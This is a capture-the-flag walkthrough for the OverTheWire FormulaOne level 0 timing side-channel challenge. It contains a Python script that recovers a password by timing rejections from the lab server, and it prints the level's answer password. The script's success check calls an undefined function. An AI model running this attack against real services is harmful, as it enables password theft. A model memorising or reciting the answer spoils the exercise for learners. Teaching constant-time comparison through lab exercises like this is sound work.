# FormulaOne Level 0 → 1

## Goal

`formulaone0` is protected by a network service that checks your password **byte-by-byte**, returning early on the first mismatch. That makes the check slightly slower for every additional byte that matches — a **timing side channel**. You extract the password one character at a time by timing how long the server takes to reject each candidate.

## Concepts you'll learn

- **Timing side-channel attacks** — when a comparison takes longer on successful prefix matches, a remote attacker can measure that difference to recover the secret
- Why **constant-time comparison** is a crypto-engineering requirement
- Using repeated samples + averaging to overcome network jitter
- Python's `time.perf_counter()` and `socket` for precise timing measurements

## Walkthrough

### 1. Understand the oracle

The level's checker returns failure as soon as it sees a wrong byte:

```c
for (int i = 0; i < len; i++) {
    if (input[i] != correct[i]) return 0;   // bail early on mismatch
}
return 1;
```

If the correct password starts with `x`, submitting `xANYTHING` makes the loop iterate twice (compares `x`, then `A`, then returns on mismatch) — slightly slower than submitting `yANYTHING` which returns immediately.

Multiply that tiny difference by averaging hundreds of measurements and the signal comes through the network jitter.

### 2. Connect and probe

You don't have login credentials for `formulaone0` — the level's "source code can be accessed by logging into a wargame hosted on the same server." That's the meta-puzzle. Once you've identified the right neighbour game (try `utumno`, `vortex`, etc.) and grabbed the source, you'll see exactly what port to connect to.

The rest of this walkthrough assumes you have the service's host and port.

### 3. Time each candidate

```python
# level0.py
import socket, time, string

HOST, PORT = "formulaone.labs.overthewire.org", 2232   # adjust as needed
ALPHABET = string.ascii_letters + string.digits + "_-"

def try_prefix(prefix, samples=50):
    total = 0
    for _ in range(samples):
        s = socket.create_connection((HOST, PORT))
        t0 = time.perf_counter()
        s.sendall(prefix.encode() + b"\n")
        _ = s.recv(1024)
        total += time.perf_counter() - t0
        s.close()
    return total / samples

known = ""
while True:
    # For each candidate next char, time the server's response.
    timings = []
    for c in ALPHABET:
        t = try_prefix(known + c + "A"*(32 - len(known) - 1))
        timings.append((c, t))
    timings.sort(key=lambda x: -x[1])   # slowest first
    best_char, best_time = timings[0]
    known += best_char
    print(f"{len(known):2d}: {known}  (best t = {best_time*1000:.2f} ms)")
    if is_auth_success_response_for(known):
        break
```

The candidate that took the longest to reject is your new known byte. Append it and repeat. For a 10-character password, this is ~10 × 60 × 50 ≈ 30 000 connections, which runs in a few minutes over normal latency.

### 4. A few calibration notes

- **Start with more samples than you think you need.** 50 per candidate is a lower bound; bump to 200 if the signal is marginal.
- **Close each connection.** Persistent connections can mask the timing.
- **Try the alphabet in random order** each round. If the server has any kind of request-ordering caching, randomising prevents it from biasing your measurements.
- **Watch for plateaus.** When two candidates have very close timings, collect more samples *just for those two* until one pulls ahead.

### 5. Submit the full password

Once every byte is locked in, run one last connection with the complete password. The server responds with the `formulaone1` password.

## The answer

The password for `formulaone1` is:

**`8YpAQCAuKf`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/formulaone/formulaone0.html>
